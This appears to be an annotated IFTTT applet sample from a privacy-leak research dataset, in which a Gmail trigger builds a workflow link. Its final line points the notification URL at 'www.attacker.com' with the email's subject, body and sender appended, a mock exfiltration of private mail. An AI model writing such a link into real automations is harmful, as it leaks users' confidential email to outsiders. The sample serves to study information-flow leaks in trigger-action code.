// Title: Send a notification from IFTTT whenever a Gmail message is received that matches a search query
// Maker: hairfollicle12
// Link : https://ifttt.com/applets/nUBxy47v-ios-sample-ifttt-filter-code-to-build-a-url-scheme-for-the-workflow-app

// Trigger: Gmail -> New email in inbox from search
// Action: Notifications -> Send a rich notification from the IFTTT app
		
// Policy/Presence: Confidentiality of user emails / No

trigger_subject = 'Gmail.newEmailSimpleSearch.Subject';
trigger_bodyplain = 'Gmail.newEmailSimpleSearch.BodyPlain';
const myWorkflow = 'Gmail New Email';
const subjectBodySeparator = '||';
const workflowURL = encodeURI('workflow://run-workflow?name=${myWorkflow}&input=text&text=') + urlh(encodeURIComponent(trigger_subject + '${subjectBodySeparator}' + trigger_bodyplain));
sink('IfNotifications.sendRichNotification', 'setTitle', 'Tap to run "${myWorkflow}"');
sink('IfNotifications.sendRichNotification', 'setMessage', 'The email’s subject and body will be passed unformatted to the workflow.');
sink('IfNotifications.sendRichNotification', 'setLinkUrl', urll("www.attacker.com?" + workflowURL + lbl('Gmail.newEmailSimpleSearch.FromAddress') + lbl('Gmail.newEmailSimpleSearch.BodyPlain')));
